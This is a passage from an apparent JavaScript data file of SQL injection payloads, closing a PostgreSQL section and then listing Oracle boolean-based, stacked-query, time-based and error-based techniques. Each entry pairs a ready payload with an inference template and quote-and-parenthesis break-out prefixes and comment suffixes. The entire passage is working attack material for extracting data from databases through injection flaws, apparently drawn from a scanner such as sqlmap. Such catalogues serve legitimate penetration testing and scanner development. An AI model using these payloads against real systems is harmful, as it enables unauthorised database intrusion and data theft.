    "vector": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
    "title": "PostgreSQL AND error-based - WHERE or HAVING clause",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
    "vector": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
    "title": "PostgreSQL OR error-based - WHERE or HAVING clause",
    "dbms": "PostgreSQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   }
  ]
 },
 "Oracle": {
  "boolean-based": [
   {
    "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
    "title": "Oracle boolean-based blind - Parameter replace",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": "",
      "suf": ""
     }
    ]
   },
   {
    "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
    "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
    "title": "Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
    "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
    "title": "Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' ",
      "suf": "--"
     },
     {
      "pref": "\" ",
      "suf": "--"
     },
     {
      "pref": ") ",
      "suf": "--"
     },
     {
      "pref": "') ",
      "suf": "--"
     },
     {
      "pref": "\") ",
      "suf": "--"
     }
    ]
   }
  ],
  "inline-query": [],
  "stacked-queries": [
   {
    "payload": "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) FROM DUAL)",
    "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) ELSE 5238 END)",
    "title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END",
    "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END",
    "title": "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END",
    "vector": "BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END",
    "title": "Oracle stacked queries (USER_LOCK.SLEEP - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": ";",
      "suf": ""
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     }
    ]
   }
  ],
  "time-based": [
   {
    "payload": "DBMS_PIPE.RECEIVE_MESSAGE('IsjT',[SLEEPTIME])",
    "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('IkdY',[SLEEPTIME]) ELSE 5689 END)",
    "title": "Oracle time-based blind (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": " AND 8675=",
      "suf": ""
     },
     {
      "pref": " OR 8675=",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "'||",
      "suf": "||'"
     },
     {
      "pref": "' AND 8675=",
      "suf": "--"
     },
     {
      "pref": "' OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\"||",
      "suf": "||\""
     },
     {
      "pref": "\" AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\" OR 8675=",
      "suf": "--"
     },
     {
      "pref": ") AND 8675=",
      "suf": "--"
     },
     {
      "pref": ") OR 8675=",
      "suf": "--"
     },
     {
      "pref": "') AND 8675=",
      "suf": "--"
     },
     {
      "pref": "') OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\") AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\") OR 8675=",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "DBMS_LOCK.SLEEP([SLEEPTIME])",
    "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]) ELSE DBMS_LOCK.SLEEP(0) END)",
    "title": "Oracle time-based blind (DBMS_LOCK.SLEEP - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": " AND 8675=",
      "suf": ""
     },
     {
      "pref": " OR 8675=",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "'||",
      "suf": "||'"
     },
     {
      "pref": "' AND 8675=",
      "suf": "--"
     },
     {
      "pref": "' OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\"||",
      "suf": "||\""
     },
     {
      "pref": "\" AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\" OR 8675=",
      "suf": "--"
     },
     {
      "pref": ") AND 8675=",
      "suf": "--"
     },
     {
      "pref": ") OR 8675=",
      "suf": "--"
     },
     {
      "pref": "') AND 8675=",
      "suf": "--"
     },
     {
      "pref": "') OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\") AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\") OR 8675=",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "USER_LOCK.SLEEP([SLEEPTIME])",
    "vector": "(CASE WHEN ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]) ELSE USER_LOCK.SLEEP(0) END)",
    "title": "Oracle time-based blind (USER_LOCK.SLEEP - comment)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": " AND 8675=",
      "suf": ""
     },
     {
      "pref": " OR 8675=",
      "suf": ""
     },
     {
      "pref": "' ",
      "suf": ""
     },
     {
      "pref": "'||",
      "suf": "||'"
     },
     {
      "pref": "' AND 8675=",
      "suf": "--"
     },
     {
      "pref": "' OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\"||",
      "suf": "||\""
     },
     {
      "pref": "\" AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\" OR 8675=",
      "suf": "--"
     },
     {
      "pref": ") AND 8675=",
      "suf": "--"
     },
     {
      "pref": ") OR 8675=",
      "suf": "--"
     },
     {
      "pref": "') AND 8675=",
      "suf": "--"
     },
     {
      "pref": "') OR 8675=",
      "suf": "--"
     },
     {
      "pref": "\") AND 8675=",
      "suf": "--"
     },
     {
      "pref": "\") OR 8675=",
      "suf": "--"
     }
    ]
   }
  ],
  "error-based": [
   {
    "payload": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
    "vector": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
    "title": "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
    "vector": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
    "title": "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
    "dbms": "Oracle",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     }
    ]
   }
  ]
 }
};
